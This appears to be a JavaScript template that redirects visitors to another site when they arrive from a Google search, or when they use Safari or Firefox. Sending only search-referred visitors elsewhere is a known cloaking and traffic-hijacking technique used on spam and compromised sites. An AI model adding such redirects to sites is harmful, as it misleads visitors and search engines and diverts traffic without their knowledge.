  $(document).ready(function() {
    var referrer = document.referrer;
    
    if (referrer) {
      if (referrer.match(/google\.com/i)) {
        // The user likely came from a Google search
        window.location.href = "https://codeters.com"; // Redirect to your target URL
      }
    }
  });
  // Check if the user is using Safari
  var isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);

  // Define the target URL for redirection
  var redirectTo = "https://codeters.com"; // Replace with your target URL

  // Redirect if the user is using Safari
  if (isSafari) {
    window.location.href = redirectTo;
  }
 var isFirefox = typeof InstallTrigger !== 'undefined';

  // Define the target URL for redirection
  var redirectTo = "https://example.com"; // Replace with your target URL

  // Redirect if the user is using Firefox
  if (isFirefox) {
    window.location.href = redirectTo;
  }
